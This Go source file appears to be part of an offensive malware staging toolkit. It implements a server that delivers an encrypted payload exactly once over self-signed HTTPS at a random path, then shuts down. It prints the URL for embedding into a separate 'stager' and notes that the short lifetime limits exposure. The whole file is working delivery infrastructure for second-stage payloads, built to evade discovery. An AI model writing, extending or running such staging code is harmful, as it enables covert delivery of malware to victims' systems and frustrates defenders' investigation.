package stage

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"sync/atomic"
	"time"
)

// Server is a one-time HTTPS payload server.
// It serves the encrypted payload blob exactly once, then shuts down.
// This limits exposure: the payload URL is only live until the first download.
type Server struct {
	data    []byte
	port    int
	served  atomic.Bool
}

// NewServer creates a Server that will deliver data over HTTPS on the given port.
func NewServer(data []byte, port int) *Server {
	return &Server{data: data, port: port}
}

// ListenAndServe starts the one-time HTTPS server and blocks until the payload
// has been delivered (or the process is interrupted).
func (s *Server) ListenAndServe() error {
	tlsCfg, err := selfSignedTLS()
	if err != nil {
		return fmt.Errorf("generating TLS cert: %w", err)
	}

	mux := http.NewServeMux()

	// Random-ish path so the endpoint isn't trivially guessable.
	token, err := randomHex(8)
	if err != nil {
		return err
	}
	path := "/" + token

	srv := &http.Server{
		Addr:      fmt.Sprintf(":%d", s.port),
		Handler:   mux,
		TLSConfig: tlsCfg,
	}

	mux.HandleFunc(path, func(w http.ResponseWriter, r *http.Request) {
		// Only serve once.
		if !s.served.CompareAndSwap(false, true) {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(s.data)))
		_, _ = w.Write(s.data)

		// Shut down after the response is flushed.
		go func() {
			time.Sleep(500 * time.Millisecond)
			_ = srv.Shutdown(context.Background())
		}()
	})

	// Default handler returns 404 for all other paths.
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})

	addrs, _ := localAddresses()
	fmt.Printf("[+] One-time payload URL (bake into stager via --url):\n")
	for _, a := range addrs {
		fmt.Printf("    https://%s:%d%s\n", a, s.port, path)
	}
	fmt.Printf("[i] Server will shut down after one download.\n")

	ln, err := tls.Listen("tcp", fmt.Sprintf(":%d", s.port), tlsCfg)
	if err != nil {
		return err
	}
	return srv.Serve(ln)
}

// ── helpers ───────────────────────────────────────────────────────────────────

func selfSignedTLS() (*tls.Config, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: "localhost"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
	}

	// Add all local non-loopback IPs to the cert so the stager can verify (or skip).
	addrs, _ := localAddresses()
	for _, a := range addrs {
		if ip := net.ParseIP(a); ip != nil {
			tmpl.IPAddresses = append(tmpl.IPAddresses, ip)
		}
	}

	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return nil, err
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}

	return &tls.Config{Certificates: []tls.Certificate{cert}}, nil
}

func localAddresses() ([]string, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	var out []string
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			var ip net.IP
			switch v := a.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ip4 := ip.To4(); ip4 != nil {
				out = append(out, ip4.String())
			}
		}
	}
	return out, nil
}

func randomHex(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return fmt.Sprintf("%x", b), nil
}
